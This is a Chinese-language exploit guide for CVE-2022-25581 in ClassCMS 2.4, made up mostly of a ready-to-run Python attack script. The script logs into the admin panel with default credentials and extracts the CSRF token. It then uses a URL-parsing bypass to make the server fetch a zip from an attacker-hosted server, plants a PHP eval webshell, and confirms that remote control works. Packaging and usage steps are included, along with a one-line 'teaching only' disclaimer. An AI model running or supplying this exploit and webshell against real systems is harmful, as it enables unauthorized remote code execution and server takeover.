# CVE-2022-25581

全网都搜不到，留下备份，**Python 利用脚本**，用于自动完成以下步骤：

---

### ✅ 脚本功能目标

1. 登录后台（获取 `csrf` 和 `token`）
2. 构造恶意请求包上传压缩包（包含 webshell）
3. 访问上传的 webshell 获取控制权限（GET shell）

---

## 🧾 前提条件

- 目标环境：ClassCMS 2.4
- Web服务器：PHP 5.5 + MySQL
- 攻击者拥有一个可访问的 HTTP 服务器（用于托管 `shell.zip`）
- 已知后台路径（如 `/admin666`）
- 后台账号密码为 `admin/admin`

---

## 🔒 漏洞利用原理回顾

该任意文件下载漏洞的核心是构造一个特殊格式的 URL：

```
http://@<ip>:80@classcms.com/shell.zip
```

通过 PHP 的 `parse_url()` 与 `curl` 对 URL 解析方式的不同，绕过 host 白名单校验。

---

## 🐍 Python 利用脚本

```python
import requests
from bs4 import BeautifulSoup

# =============== 配置信息 ===============
target_url = "http://192.168.12.144"
admin_path = "/admin666"  # 后台路径
login_url = f"{target_url}{admin_path}?do=login"

download_url = f"{target_url}{admin_path}?do=shop:downloadClass&ajax=1"

# 你的攻击服务器地址（必须能被目标访问到）
attacker_ip = "192.168.12.144"
attacker_port = 80
shell_zip_url = f"http://@{attacker_ip}:{attacker_port}@classcms.com/shell.zip"

# webshell 文件名
webshell_name = "shell.php"
webshell_path = f"{target_url}/class/shell/{webshell_name}"

# 登录凭证
username = "admin"
password = "admin"

# ========================================

# 设置 session 维持 cookie
session = requests.Session()

# ================ Step 1: 登录后台 ================
def login():
    print("[*] 正在登录后台...")
    data = {
        "username": username,
        "password": password
    }
    res = session.post(login_url, data=data)
    if "退出登录" in res.text:
        print("[+] 登录成功！")
        return True
    else:
        print("[-] 登录失败，请检查用户名/密码或后台路径是否正确。")
        return False

# ================ Step 2: 获取 csrf token ================
def get_csrf():
    url = f"{target_url}{admin_path}?do=shop:index&action=detail&classhash=debugswitch"
    res = session.get(url)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    if csrf_input:
        return csrf_input['value']
    else:
        print("[-] 无法提取 csrf token！")
        return None

# ================ Step 3: 上传压缩包并解压 ================
def upload_shell(csrf_token):
    print(f"[*] 正在上传 {shell_zip_url} ...")

    payload = {
        "classhash": "shell",
        "url": shell_zip_url,
        "csrf": csrf_token
    }

    headers = {
        "User-Agent": "Mozilla/5.0",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }

    res = session.post(download_url, data=payload, headers=headers)

    if res.status_code == 200 and "下载完成" in res.text:
        print("[+] 上传成功！")
        return True
    else:
        print("[-] 上传失败，响应内容：", res.text)
        return False

# ================ Step 4: 尝试访问 webshell ================
def check_webshell():
    print(f"[*] 正在尝试访问 webshell：{webshell_path}")
    try:
        res = session.get(webshell_path, timeout=5)
        if res.status_code == 200:
            print("[+] 成功访问 webshell，你现在可以使用菜刀/蚁剑连接！")
            print(f"[+] 地址：{webshell_path}")
        else:
            print("[-] webshell 未找到或未执行。")
    except Exception as e:
        print("[-] 连接异常：", str(e))

# ================ 主函数 ================
if __name__ == "__main__":
    if login():
        csrf = get_csrf()
        if csrf:
            if upload_shell(csrf):
                check_webshell()
```

---

## 📁 shell.zip 文件制作方法

1. 创建 `shell.php` 内容如下：
   ```php
   <?php @eval($_POST['cmd']); ?>
   ```

2. 打包为 `shell.zip`，确保结构为根目录直接包含 `shell.php`。

3. 放在你的攻击服务器上，确保可通过以下 URL 访问：
   ```
   http://192.168.12.144/shell.zip
   ```

---

## 🛠️ 使用说明

1. 安装依赖：

```bash
pip install requests beautifulsoup4
```

2. 修改脚本中的 IP、端口、路径等配置项。
3. 在攻击服务器启动 HTTP 服务，提供 `shell.zip` 下载。
4. 执行脚本：

```bash
python exploit_classcms.py
```

---

## 📌 注意事项

- 确保攻击服务器开放 80 端口且 `shell.zip` 可正常下载。
- 若目标后台路径不同，请修改 `admin_path`。
- 如遇 CSRF 校验失败，请重新抓包确认 token 是否更新。
- 此脚本仅供教学研究用途，请勿用于非法入侵！

---
